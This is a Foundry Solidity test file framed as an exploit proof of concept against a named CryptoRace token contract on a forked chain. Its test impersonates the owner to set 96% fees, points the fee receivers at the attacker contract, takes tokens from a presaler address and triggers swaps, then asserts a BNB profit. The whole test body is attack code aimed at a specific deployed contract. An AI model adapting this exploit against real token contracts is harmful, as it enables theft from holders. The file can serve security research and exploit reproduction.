pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ICryptoRace {
    function getOwner() external view returns (address);
    function setFees(uint256 _liquidityFee, uint256 _buybackFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _feeDenominator) external;
    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function router() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x35240D91223186133fCb0EC1565c353eb2A546A8;
    address attacker = address(this);
    address owner;
    ICryptoRace token;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use fork mode
        // Label addresses for clarity
        vm.label(TARGET, "CryptoRace Token");
        vm.label(0x8dC24A8807AB398b5c8a939288Fb010b7572827D, "Presaler");

        // Get the owner address from the contract
        token = ICryptoRace(TARGET);
        owner = token.getOwner();
        vm.label(owner, "Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Record initial BNB balance
        uint256 initialBalance = address(this).balance;

        // Step 2: Impersonate owner to set fees (96% total: 2400 each / 10000)
        vm.prank(owner);
        token.setFees(2400, 2400, 2400, 2400, 10000); // 96% total fee

        // Step 3: Set fee receivers to attacker
        vm.prank(owner);
        token.setFeeReceivers(address(this), address(this));

        // Step 4: Get some CRACE tokens from presaler
        address presaler = 0x8dC24A8807AB398b5c8a939288Fb010b7572827D;
        vm.prank(presaler);
        token.transfer(address(this), 1000000 * 10**9); // Transfer 1M tokens to attacker

        // Check attacker token balance
        uint256 attackerBalance = token.balanceOf(address(this));
        console.log("Attacker token balance:", attackerBalance);

        // Step 5: Transfer tokens to trigger fee collection
        // Need to transfer enough to reach swapThreshold
        // swapThreshold = totalSupply / 100 = 500,000 * 10^9
        // Let's transfer 600,000 * 10^9 tokens
        address recipient = address(0x123); // arbitrary recipient

        console.log("Transferring tokens to trigger fees...");
        vm.prank(address(this));
        token.transfer(recipient, 600000 * 10**9);

        // Step 6: Check if swap happened (contract should have accumulated fees)
        uint256 contractTokenBalance = token.balanceOf(TARGET);
        console.log("Contract token balance:", contractTokenBalance);

        // Step 7: If swapThreshold reached, swapBack should be called automatically
        // on next transfer or we can trigger it with another transfer
        if (contractTokenBalance >= 500000 * 10**9) {
            console.log("Swap threshold reached, fees should be converted to BNB");

            // Trigger another transfer to force swapBack
            vm.prank(address(this));
            token.transfer(recipient, 10000 * 10**9);
        }

        // Step 8: Check if BNB balance increased
        uint256 finalBalance = address(this).balance;
        console.log("Initial BNB:", initialBalance);
        console.log("Final BNB:", finalBalance);
        assertGt(finalBalance, initialBalance, "BNB balance should increase");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
